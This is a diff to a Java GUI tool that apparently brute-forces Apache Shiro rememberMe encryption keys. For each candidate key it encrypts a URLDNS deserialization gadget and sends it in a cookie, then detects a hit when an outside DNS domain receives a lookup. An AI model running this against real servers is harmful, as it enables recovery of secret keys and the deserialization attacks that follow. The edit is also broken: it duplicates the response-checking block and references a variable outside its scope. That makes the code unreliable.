@@ -207,10 +207,24 @@ public class MainApp extends Application {
                                     try {
                                         switch (CheckMethod){
                                             case 0:
-                                                bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
-                                                String rememberMe = (ShiroAESCrypto.encrypt(bytes, new BASE64Decoder().decodeBuffer(key))).replaceAll("\n", "");//.replaceAll("\\+","%2b");;
-                                                String cookie = "rememberMe=" + rememberMe+";";
-                                                HttpResponse response = sendHttpRequest(url,cookie);
+                                                try {
+                                        bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
+                                        String rememberMe = obtainEncryptedPayload(key, bytes);
+                                        String cookie = "rememberMe=" + rememberMe+";";
+                                        HttpResponse response = sendHttpRequest(url,cookie);
+
+                                        if(response != null && response.getStatusLine().getStatusCode() == 200){
+                                            if (response.getStatusLine().getStatusCode() == 200) {
+                                                displayResult("send " + key + "\tok");
+                                            } else {
+                                                displayResult("send " + key + "\tfailed");
+                                            }
+                                        }else{
+                                            displayResult("send " + key + "\terror");
+                                        }
+                                    } catch (Exception e) {
+                                        displayResult("send " + key + "\terror");
+                                    }
 
                                                 if(response != null && response.getStatusLine().getStatusCode() == 200){
                                                     if (response.getStatusLine().getStatusCode() == 200) {
